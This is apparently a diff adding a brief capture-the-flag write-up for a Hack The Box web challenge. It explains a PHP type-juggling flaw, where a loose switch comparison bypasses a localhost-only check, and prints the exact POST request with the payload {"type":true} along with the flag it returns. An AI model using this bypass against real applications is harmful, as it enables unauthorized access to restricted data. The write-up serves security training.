@@ -1,0 +1,39 @@
+access: http://165.232.42.76:31856/
+click spooky factas, some type juggling take attention:
+
+strict validation on type secrets:
+if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
+{
+    return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
+}
+
+but not in switch case validation:
+switch ($jsondata['type'])
+    {
+        case 'secrets':
+            return $router->jsonify([
+                'facts' => $this->facts->get_facts('secrets')
+            ]);
+
+intercept using burpsuite payload request to true:
+POST /api/getfacts HTTP/1.1
+Host: 165.232.42.76:31856
+Content-Length: 13
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://165.232.42.76:31856
+Referer: http://165.232.42.76:31856/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"type":true}
+
+response:
+{"facts":[{"id":19,"fact":"HTB{juggl1ng_1s_d4ng3r0u5!!!}","fact_type":"secrets"}]}
+
+flag: HTB{juggl1ng_1s_d4ng3r0u5!!!}
+
+resource:
+https://medium.com/codex/hack-the-boo-juggling-facts-fb79f2224ec1
